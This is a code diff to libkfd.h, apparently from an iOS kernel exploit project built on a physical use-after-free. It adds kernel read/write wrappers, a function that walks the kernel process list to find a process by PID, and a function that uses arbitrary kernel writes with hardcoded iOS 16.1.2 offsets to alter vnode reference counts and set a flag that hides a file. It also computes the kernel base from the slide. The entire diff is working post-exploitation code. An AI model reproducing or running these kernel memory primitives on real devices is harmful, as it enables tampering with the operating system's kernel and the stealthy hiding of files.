@@ -90,6 +90,7 @@ struct info {
 
 struct perf {
     u64 kernelcache_index;
+    u64 kernel_slide;
     struct {
         u64 kaddr;
         u64 paddr;
@@ -171,6 +172,110 @@ void kfd_free(struct kfd* kfd)
     bzero_free(kfd, sizeof(struct kfd));
 }
 
+void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size)
+{
+    krkw_kread((struct kfd*)(kfd), kaddr, uaddr, size);
+}
+
+void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size)
+{
+    krkw_kwrite((struct kfd*)(kfd), uaddr, kaddr, size);
+}
+
+void kclose(u64 kfd)
+{
+    kfd_free((struct kfd*)(kfd));
+}
+
+uint32_t kread32(u64 kfd, uint64_t where) {
+    uint32_t out;
+    kread(kfd, where, &out, sizeof(uint32_t));
+    return out;
+}
+uint64_t kread64(u64 kfd, uint64_t where) {
+    uint64_t out;
+    kread(kfd, where, &out, sizeof(uint64_t));
+    return out;
+}
+
+void kwrite32(u64 kfd, uint64_t where, uint32_t what) {
+    uint32_t _what = what;
+    kwrite(kfd, &_what, where, sizeof(uint32_t));
+}
+void kwrite64(u64 kfd, uint64_t where, uint64_t what) {
+    uint64_t _what = what;
+    kwrite(kfd, &_what, where, sizeof(uint64_t));
+}
+
+uint64_t getProc(u64 kfd, pid_t pid) {
+    uint64_t proc = ((struct kfd*)kfd)->info.kernel.kernel_proc;
+    
+    while (true) {
+        if(kread32(kfd, proc + 0x60/*PROC_P_PID_OFF*/) == pid) {
+            return proc;
+        }
+        proc = kread64(kfd, proc + 0x8/*PROC_P_LIST_LE_PREV_OFF*/);
+    }
+    
+    return 0;
+}
+
+uint64_t funVnode(u64 kfd, uint64_t proc, char* filename) {
+    //16.1.2 offsets
+    uint32_t off_p_pfd = 0xf8;
+    uint32_t off_fd_ofiles = off_fd_ofiles = 0x0;
+    uint32_t off_fp_fglob = 0x10;
+    uint32_t off_fg_data = 0x38;
+    uint32_t off_vnode_iocount = 0x64;
+    uint32_t off_vnode_usecount = 0x60;
+    uint32_t off_vnode_vflags = 0x54;
+    
+    int file_index = open(filename, O_RDONLY);
+    if (file_index == -1) return -1;
+    
+    //get vnode
+    uint64_t filedesc_pac = kread64(kfd, proc + off_p_pfd);
+    uint64_t filedesc = filedesc_pac | 0xffffff8000000000;
+    uint64_t openedfile = kread64(kfd, filedesc + (8 * file_index));
+    uint64_t fileglob_pac = kread64(kfd, openedfile + off_fp_fglob);
+    uint64_t fileglob = fileglob_pac | 0xffffff8000000000;
+    uint64_t vnode_pac = kread64(kfd, fileglob + off_fg_data);
+    uint64_t vnode = vnode_pac | 0xffffff8000000000;
+    printf("vnode: 0x%llx\n", vnode);
+    
+    //vnode_ref, vnode_get
+    uint32_t usecount = kread32(kfd, vnode + off_vnode_usecount);
+    uint32_t iocount = kread32(kfd, vnode + off_vnode_iocount);
+    printf("usecount: %d, iocount: %d\n", usecount, iocount);
+    kwrite32(kfd, vnode + off_vnode_usecount, usecount + 1);
+    kwrite32(kfd, vnode + off_vnode_iocount, iocount + 1);
+    
+#define VISSHADOW 0x008000
+    //hide file
+    uint32_t v_flags = kread32(kfd, vnode + off_vnode_vflags);
+    printf("v_flags: 0x%x\n", v_flags);
+    kwrite32(kfd, vnode + off_vnode_vflags, (v_flags | VISSHADOW));
+
+    //exist test (should not be exist
+    printf("[i] is File exist?: %d\n", access(filename, F_OK));
+    
+    //show file
+    v_flags = kread32(kfd, vnode + off_vnode_vflags);
+    kwrite32(kfd, vnode + off_vnode_vflags, (v_flags &= ~VISSHADOW));
+    
+    printf("[i] is File exist?: %d\n", access(filename, F_OK));
+
+    //restore vnode iocount, usecount
+    if(kread32(kfd, vnode + off_vnode_usecount) > 0)
+        kwrite32(kfd, vnode + off_vnode_usecount, usecount - 1);
+    if(kread32(kfd, vnode + off_vnode_iocount) > 0)
+        kwrite32(kfd, vnode + off_vnode_iocount, iocount - 1);
+    
+    close(file_index);
+
+    return 0;
+}
+
 u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
 {
     timer_start();
@@ -188,25 +293,22 @@ u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
     krkw_run(kfd);
     info_run(kfd);
     perf_run(kfd);
+    //
+    uint64_t kslide = kfd->info.kernel.kernel_slide;
+    uint64_t kbase = 0xfffffff007004000 + kslide;
+    uint64_t kheader64 = kread64(kfd, kbase);
+    printf("[i] Kernel base kread64 ret: 0x%llx\n", kslide);
+    pid_t myPid = getpid();
+    printf("[i] pid: %x\n", myPid);
+    uint64_t proc = ((struct kfd*)kfd)->info.kernel.kernel_proc;
+    printf("[i] kernel_proc: %llx\n", proc);
+//    uint64_t selfProc = getProc(kfd, myPid);
+//    printf("[i] self proc: 0x%llx\n", selfProc);
+//    funVnode(kfd, selfProc, "/System/Library/Audio/UISounds/photoShutter.caf");
+    //
     puaf_cleanup(kfd);
-
     timer_end();
     return (u64)(kfd);
-}
-
-void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size)
-{
-    krkw_kread((struct kfd*)(kfd), kaddr, uaddr, size);
-}
-
-void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size)
-{
-    krkw_kwrite((struct kfd*)(kfd), uaddr, kaddr, size);
-}
-
-void kclose(u64 kfd)
-{
-    kfd_free((struct kfd*)(kfd));
 }
 
 #endif /* libkfd_h */
